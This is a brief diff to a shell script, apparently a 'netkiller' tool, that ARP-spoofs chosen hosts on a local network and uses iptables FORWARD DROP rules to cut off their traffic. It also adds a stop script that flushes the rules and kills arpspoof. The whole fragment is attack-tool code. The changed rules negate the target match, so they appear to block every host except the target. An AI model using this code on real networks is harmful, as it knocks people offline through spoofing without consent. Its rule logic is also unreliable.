@@ -67,7 +67,7 @@ cat > /bin/netkiller-stop << EOF
 
 iptables -t nat -F
 iptables -F FORWARD
-pkill arpspoof
+pkill -f arpspoof
 echo "Restoring the connection..."
 EOF
 chmod 755 /bin/netkiller-stop
@@ -103,8 +103,8 @@ for TARGET in $TARGET_IPS; do
         fi
     else
         # Blocking traffic for Single IP
-        iptables -I FORWARD -s "$TARGET" -d "$GATEWAY" -j DROP
-        iptables -I FORWARD -s "$GATEWAY" -d "$TARGET" -j DROP
+        iptables -I FORWARD ! -s "$TARGET" -d "$GATEWAY" -j DROP
+        iptables -I FORWARD -s "$GATEWAY" ! -d "$TARGET" -j DROP
 
         # Bidirectional Arp Spoofing policy
     (   
